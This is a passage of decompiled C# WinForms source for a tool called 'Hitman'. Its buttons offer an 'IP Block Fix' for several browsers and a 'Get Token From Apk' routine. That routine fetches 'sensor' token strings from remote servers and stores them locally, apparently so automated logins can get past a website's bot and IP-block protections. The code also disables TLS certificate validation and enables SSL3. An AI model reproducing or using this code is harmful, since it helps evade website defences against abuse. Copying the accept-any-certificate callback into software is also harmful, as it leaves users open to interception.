			Form owner = new Form
			{
				TopMost = true
			};
			string text = "Aapka Pehle ka IP Block Fix Save hai\nIP Block Fix karne ki Zaroorat nahi hai\nAgar New IP Block Fix chahte hain to YES Button Click Karen";
			string caption = "Hitman";
			if (MessageBox.Show(owner, text, caption, MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes)
			{
				await StartOperaAndConnect();
			}
		}
		else
		{
			await StartOperaAndConnect();
		}
	}

	private string getLink()
	{
		string text = "";
		string text2 = "";
		string text3 = "https://raw.githubusercontent.com/hitmants2026-a11y/Hitman/refs/heads/main/getlinkapktoken";
		string requestUriString = text3;
		bool flag = true;
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(requestUriString);
			httpWebRequest.ServerCertificateValidationCallback = CertificateValidation;
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
			string method = "GET";
			httpWebRequest.Method = method;
			httpWebRequest.Timeout = 65000;
			httpWebRequest.ReadWriteTimeout = 65000;
			using StreamReader streamReader = new StreamReader(((HttpWebResponse)httpWebRequest.GetResponse()).GetResponseStream());
			text = streamReader.ReadToEnd().Trim();
			if (string.IsNullOrEmpty(text))
			{
				text = "https://hitmanxxx.com/Hitman/sensor";
			}
			return text;
		}
		catch (Exception)
		{
		}
		return "https://hitmanxxx.com/Hitman/sensor";
	}

	private bool CertificateValidation(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
	{
		return true;
	}

	private string ReadOTP()
	{
		string empty = string.Empty;
		string text = string.Empty;
		string link = getLink();
		string requestUriString = link;
		string[] array = new string[5];
		string text2 = "{\"userId\":\"";
		array[0] = text2;
		array[1] = Program.clientID;
		string text3 = "\", \"LastChar\":\"";
		array[2] = text3;
		string text4 = "0";
		array[3] = text4;
		string text5 = "\"}";
		array[4] = text5;
		string text6 = string.Concat(array);
		while (true)
		{
			try
			{
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(requestUriString);
				ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
				string contentType = "application/json";
				httpWebRequest.ContentType = contentType;
				string method = "POST";
				httpWebRequest.Method = method;
				httpWebRequest.Timeout = 10000;
				httpWebRequest.ReadWriteTimeout = 10000;
				using (StreamWriter streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
				{
					string value = text6;
					streamWriter.Write(value);
				}
				using StreamReader streamReader = new StreamReader(((HttpWebResponse)httpWebRequest.GetResponse()).GetResponseStream());
				empty = streamReader.ReadToEnd();
				string text7 = empty;
				string value2 = "6,a,";
				if (text7.Contains(value2))
				{
					text = empty;
					ProcessAndSaveSensorData(text);
				}
				Refreshtoken();
			}
			catch (WebException)
			{
				Application.DoEvents();
				Thread.Sleep(500);
				continue;
			}
			break;
		}
		return text;
	}

	private void ProcessAndSaveSensorData(string rawApiResponse)
	{
		try
		{
			List<string> list = JsonConvert.DeserializeObject<List<string>>(rawApiResponse);
			if (list == null || list.Count == 0)
			{
				return;
			}
			List<string> list2 = new List<string>();
			if (File.Exists(jsonFilePath))
			{
				list2 = JsonConvert.DeserializeObject<List<string>>(File.ReadAllText(jsonFilePath)) ?? new List<string>();
			}
			bool flag = false;
			foreach (string item in list)
			{
				string value = "6,a,";
				if (item.StartsWith(value) && !list2.Contains(item))
				{
					list2.Add(item);
					flag = true;
					string value2 = "New Sensor Data Found and Added.";
					Console.WriteLine(value2);
				}
			}
			if (flag)
			{
				string contents = JsonConvert.SerializeObject(list2, Formatting.Indented);
				File.WriteAllText(jsonFilePath, contents);
			}
			else
			{
				string value3 = "No new unique data to add.";
				Console.WriteLine(value3);
			}
		}
		catch (Exception ex)
		{
			string text = "Error processing data: ";
			Console.WriteLine(text + ex.Message);
		}
	}

	private void button6_Click(object sender, EventArgs e)
	{
		ReadOTP();
		Refreshtoken();
	}

	private void Refreshtoken_old()
	{
		string text = "SensorList.json";
		string path = text;
		string empty = string.Empty;
		try
		{
			if (!File.Exists(path))
			{
				string value = "File nahi mili!";
				Console.WriteLine(value);
			}
			List<string> list = JsonConvert.DeserializeObject<List<string>>(File.ReadAllText(path)) ?? new List<string>();
			if (list.Count <= 0)
			{
				string value2 = "JSON file khali hai!";
				Console.WriteLine(value2);
			}
			label7.Text = "Token Count :-  " + list.Count;
		}
		catch
		{
		}
	}

	private void Refreshtoken()
	{
		string path = "SensorList.json";
		try
		{
			if (!File.Exists(path))
			{
				Console.WriteLine("File nahi mili!");
				return;
			}
			DateTime creationTime = File.GetCreationTime(path);
			if (DateTime.Now > creationTime.AddHours(4.0))
			{
				File.Delete(path);
				Console.WriteLine("SensorList.json 4 hour purani thi, delete kar di gayi.");
				label7.Text = "Token Count :- 0";
				return;
			}
			List<string> list = JsonConvert.DeserializeObject<List<string>>(File.ReadAllText(path)) ?? new List<string>();
			if (list.Count <= 0)
			{
				Console.WriteLine("JSON file khali hai!");
			}
			label7.Text = "Token Count :- " + list.Count;
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	private void Form2_Load(object sender, EventArgs e)
	{
		string plainText = "https://gofile.io/d/ipP6xD";
		QRCodeGenerator qRCodeGenerator = new QRCodeGenerator();
		QRCodeData data = qRCodeGenerator.CreateQrCode(plainText, QRCodeGenerator.ECCLevel.Q);
		Base64QRCode base64QRCode = new Base64QRCode(data);
		string graphic = base64QRCode.GetGraphic(20);
		pictureBox2.Image = LoadImage(graphic);
		Refreshtoken();
	}

	public Image LoadImage(string strin_1)
	{
		byte[] buffer = Convert.FromBase64String(strin_1);
		using MemoryStream stream = new MemoryStream(buffer);
		return Image.FromStream(stream);
	}

	private async void button7_Click(object sender, EventArgs e)
	{
		cometpath = "Check_IP_Block_edge";
		if (File.Exists(edgepath))
		{
			Form owner = new Form
			{
				TopMost = true
			};
			string text = "Aapka Pehle ka IP Block Fix Save hai\nIP Block Fix karne ki Zaroorat nahi hai\nAgar New IP Block Fix chahte hain to YES Button Click Karen";
			string caption = "Hitman";
			if (MessageBox.Show(owner, text, caption, MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes)
			{
				await StartCometAndConnect();
			}
		}
		else
		{
			await StartCometAndConnect();
		}
	}

	private void pictureBox1_Click(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(APP_FRAMEWORK.Form2));
		this.button1 = new System.Windows.Forms.Button();
		this.button2 = new System.Windows.Forms.Button();
		this.button3 = new System.Windows.Forms.Button();
		this.pnlHeader = new System.Windows.Forms.Panel();
		this.btnClose = new Bunifu.Framework.UI.BunifuImageButton();
		this.formName = new System.Windows.Forms.Label();
		this.label1 = new System.Windows.Forms.Label();
		this.label2 = new System.Windows.Forms.Label();
		this.label3 = new System.Windows.Forms.Label();
		this.button4 = new System.Windows.Forms.Button();
		this.label4 = new System.Windows.Forms.Label();
		this.pictureBox1 = new System.Windows.Forms.PictureBox();
		this.label5 = new System.Windows.Forms.Label();
		this.button5 = new System.Windows.Forms.Button();
		this.label6 = new System.Windows.Forms.Label();
		this.button6 = new System.Windows.Forms.Button();
		this.label7 = new System.Windows.Forms.Label();
		this.label8 = new System.Windows.Forms.Label();
		this.button7 = new System.Windows.Forms.Button();
		this.pictureBox2 = new System.Windows.Forms.PictureBox();
		this.pnlHeader.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.btnClose).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.pictureBox2).BeginInit();
		base.SuspendLayout();
		this.button1.Location = new System.Drawing.Point(396, 49);
		this.button1.Name = "button1";
		this.button1.Size = new System.Drawing.Size(8, 8);
		this.button1.TabIndex = 0;
		this.button1.Text = "button1";
		this.button1.UseVisualStyleBackColor = true;
		this.button2.BackColor = System.Drawing.SystemColors.Info;
		this.button2.FlatStyle = System.Windows.Forms.FlatStyle.Popup;
		this.button2.Location = new System.Drawing.Point(365, 84);
		this.button2.Name = "button2";
		this.button2.Size = new System.Drawing.Size(180, 33);
		this.button2.TabIndex = 1;
		this.button2.Text = "Check IP Block";
		this.button2.UseVisualStyleBackColor = false;
		this.button2.Click += new System.EventHandler(button2_Click);
		this.button3.BackColor = System.Drawing.Color.MistyRose;
		this.button3.FlatStyle = System.Windows.Forms.FlatStyle.Popup;
		this.button3.Location = new System.Drawing.Point(365, 40);
		this.button3.Name = "button3";
		this.button3.Size = new System.Drawing.Size(180, 35);
		this.button3.TabIndex = 2;
		this.button3.Text = "Check IP Block";
		this.button3.UseVisualStyleBackColor = false;
		this.button3.Click += new System.EventHandler(button3_Click);
		this.pnlHeader.AutoSize = true;
		this.pnlHeader.AutoSizeMode = System.Windows.Forms.AutoSizeMode.GrowAndShrink;
		this.pnlHeader.BackColor = System.Drawing.Color.MediumSlateBlue;
		this.pnlHeader.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.pnlHeader.Controls.Add(this.btnClose);
		this.pnlHeader.Controls.Add(this.formName);
		this.pnlHeader.Dock = System.Windows.Forms.DockStyle.Top;
		this.pnlHeader.ForeColor = System.Drawing.Color.Yellow;
		this.pnlHeader.Location = new System.Drawing.Point(0, 0);
		this.pnlHeader.Margin = new System.Windows.Forms.Padding(2);
		this.pnlHeader.Name = "pnlHeader";
		this.pnlHeader.Size = new System.Drawing.Size(557, 25);
		this.pnlHeader.TabIndex = 131;
		this.btnClose.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		this.btnClose.BackColor = System.Drawing.Color.Transparent;
		this.btnClose.Cursor = System.Windows.Forms.Cursors.Hand;
		this.btnClose.Image = (System.Drawing.Image)resources.GetObject("btnClose.Image");
		this.btnClose.ImageActive = null;
		this.btnClose.Location = new System.Drawing.Point(531, -1);
		this.btnClose.Margin = new System.Windows.Forms.Padding(2);
		this.btnClose.Name = "btnClose";
		this.btnClose.Size = new System.Drawing.Size(22, 22);
		this.btnClose.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.btnClose.TabIndex = 25;
		this.btnClose.TabStop = false;
		this.btnClose.Zoom = 10;
		this.btnClose.Click += new System.EventHandler(btnClose_Click);
		this.formName.AutoSize = true;
		this.formName.BackColor = System.Drawing.Color.Transparent;
		this.formName.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.formName.ForeColor = System.Drawing.Color.Black;
		this.formName.Location = new System.Drawing.Point(3, 4);
		this.formName.Name = "formName";
		this.formName.Size = new System.Drawing.Size(141, 16);
		this.formName.TabIndex = 23;
		this.formName.Text = "Web Login Settings";
		this.label1.AutoSize = true;
		this.label1.BackColor = System.Drawing.Color.Transparent;
		this.label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.label1.ForeColor = System.Drawing.Color.Black;
		this.label1.Location = new System.Drawing.Point(171, 92);
		this.label1.Name = "label1";
		this.label1.Size = new System.Drawing.Size(178, 16);
		this.label1.TabIndex = 132;
		this.label1.Text = "Web-3 ( Microsoft Edge )";
		this.label2.AutoSize = true;
		this.label2.BackColor = System.Drawing.Color.Transparent;
		this.label2.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.label2.ForeColor = System.Drawing.Color.Black;
		this.label2.Location = new System.Drawing.Point(163, 51);
		this.label2.Name = "label2";
		this.label2.Size = new System.Drawing.Size(186, 16);
		this.label2.TabIndex = 133;
		this.label2.Text = "Web- 2 ( Google Chrome )";
		this.label3.AutoSize = true;
		this.label3.BackColor = System.Drawing.Color.Transparent;
		this.label3.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.label3.ForeColor = System.Drawing.Color.Black;
		this.label3.Location = new System.Drawing.Point(234, 138);
		this.label3.Name = "label3";
		this.label3.Size = new System.Drawing.Size(102, 16);
		this.label3.TabIndex = 135;
		this.label3.Text = "Web ( Brave )";
		this.button4.BackColor = System.Drawing.Color.MistyRose;
		this.button4.FlatStyle = System.Windows.Forms.FlatStyle.Popup;
		this.button4.Location = new System.Drawing.Point(365, 129);
		this.button4.Name = "button4";
		this.button4.Size = new System.Drawing.Size(180, 35);
		this.button4.TabIndex = 134;
		this.button4.Text = "Check IP Block";
		this.button4.UseVisualStyleBackColor = false;
		this.button4.Click += new System.EventHandler(button4_Click);
		this.label4.BackColor = System.Drawing.Color.FromArgb(255, 192, 255);
		this.label4.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.label4.ForeColor = System.Drawing.Color.Black;
		this.label4.Location = new System.Drawing.Point(-2, 322);
		this.label4.Name = "label4";
		this.label4.Size = new System.Drawing.Size(556, 97);
		this.label4.TabIndex = 136;
		this.label4.Text = resources.GetString("label4.Text");
		this.label4.Click += new System.EventHandler(label4_Click);
		this.pictureBox1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
		this.pictureBox1.Image = (System.Drawing.Image)resources.GetObject("pictureBox1.Image");
		this.pictureBox1.Location = new System.Drawing.Point(0, 30);
		this.pictureBox1.Name = "pictureBox1";
		this.pictureBox1.Size = new System.Drawing.Size(154, 124);
		this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.pictureBox1.TabIndex = 137;
		this.pictureBox1.TabStop = false;
		this.pictureBox1.Click += new System.EventHandler(pictureBox1_Click);
		this.label5.AutoSize = true;
		this.label5.BackColor = System.Drawing.Color.Transparent;
		this.label5.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.label5.ForeColor = System.Drawing.Color.Black;
		this.label5.Location = new System.Drawing.Point(234, 189);
		this.label5.Name = "label5";
		this.label5.Size = new System.Drawing.Size(104, 16);
		this.label5.TabIndex = 139;
		this.label5.Text = "Web ( Opera )";
		this.button5.BackColor = System.Drawing.Color.MistyRose;
		this.button5.FlatStyle = System.Windows.Forms.FlatStyle.Popup;
		this.button5.Location = new System.Drawing.Point(365, 180);
		this.button5.Name = "button5";
		this.button5.Size = new System.Drawing.Size(180, 35);
		this.button5.TabIndex = 138;
		this.button5.Text = "Check IP Block";
		this.button5.UseVisualStyleBackColor = false;
		this.button5.Click += new System.EventHandler(button5_Click);
		this.label6.AutoSize = true;
		this.label6.BackColor = System.Drawing.Color.Transparent;
		this.label6.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.label6.ForeColor = System.Drawing.Color.Black;
		this.label6.Location = new System.Drawing.Point(234, 285);
		this.label6.Name = "label6";
		this.label6.Size = new System.Drawing.Size(112, 16);
		this.label6.TabIndex = 141;
		this.label6.Text = "APK Token Get";
		this.button6.BackColor = System.Drawing.Color.MistyRose;
		this.button6.FlatStyle = System.Windows.Forms.FlatStyle.Popup;
		this.button6.Location = new System.Drawing.Point(365, 276);
		this.button6.Name = "button6";
		this.button6.Size = new System.Drawing.Size(180, 35);
		this.button6.TabIndex = 140;
		this.button6.Text = "Get Token From Apk";
		this.button6.UseVisualStyleBackColor = false;
		this.button6.Click += new System.EventHandler(button6_Click);
		this.label7.AutoSize = true;
		this.label7.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.label7.ForeColor = System.Drawing.Color.Red;
		this.label7.Location = new System.Drawing.Point(4, 302);
		this.label7.Name = "label7";
		this.label7.Size = new System.Drawing.Size(127, 16);
		this.label7.TabIndex = 142;
		this.label7.Text = "Token Count :-   0";
		this.label8.AutoSize = true;
		this.label8.BackColor = System.Drawing.Color.Transparent;
		this.label8.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.label8.ForeColor = System.Drawing.Color.Black;
		this.label8.Location = new System.Drawing.Point(234, 238);
		this.label8.Name = "label8";
		this.label8.Size = new System.Drawing.Size(105, 16);
		this.label8.TabIndex = 144;
		this.label8.Text = "Web ( Comet )";
		this.button7.BackColor = System.Drawing.Color.MistyRose;
		this.button7.FlatStyle = System.Windows.Forms.FlatStyle.Popup;
		this.button7.Location = new System.Drawing.Point(365, 229);
		this.button7.Name = "button7";
		this.button7.Size = new System.Drawing.Size(180, 35);
		this.button7.TabIndex = 143;
		this.button7.Text = "Check IP Block";
		this.button7.UseVisualStyleBackColor = false;
		this.button7.Click += new System.EventHandler(button7_Click);
		this.pictureBox2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
		this.pictureBox2.Image = (System.Drawing.Image)resources.GetObject("pictureBox2.Image");
		this.pictureBox2.Location = new System.Drawing.Point(0, 173);
		this.pictureBox2.Name = "pictureBox2";
		this.pictureBox2.Size = new System.Drawing.Size(154, 124);
		this.pictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.pictureBox2.TabIndex = 145;
		this.pictureBox2.TabStop = false;
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(557, 419);
		base.Controls.Add(this.pictureBox2);
		base.Controls.Add(this.label8);
		base.Controls.Add(this.button7);
		base.Controls.Add(this.label7);
		base.Controls.Add(this.label6);
		base.Controls.Add(this.button6);
		base.Controls.Add(this.label5);
		base.Controls.Add(this.button5);
		base.Controls.Add(this.pictureBox1);
		base.Controls.Add(this.label4);
		base.Controls.Add(this.label3);
		base.Controls.Add(this.button4);
		base.Controls.Add(this.label2);
		base.Controls.Add(this.label1);
		base.Controls.Add(this.pnlHeader);
		base.Controls.Add(this.button3);
		base.Controls.Add(this.button2);
		base.Controls.Add(this.button1);
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
		base.Name = "Form2";
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = "Form2";
		base.Load += new System.EventHandler(Form2_Load);
		this.pnlHeader.ResumeLayout(false);
		this.pnlHeader.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.btnClose).EndInit();
		((System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
		((System.ComponentModel.ISupportInitialize)this.pictureBox2).EndInit();
		base.ResumeLayout(false);
		base.PerformLayout();
	}
}
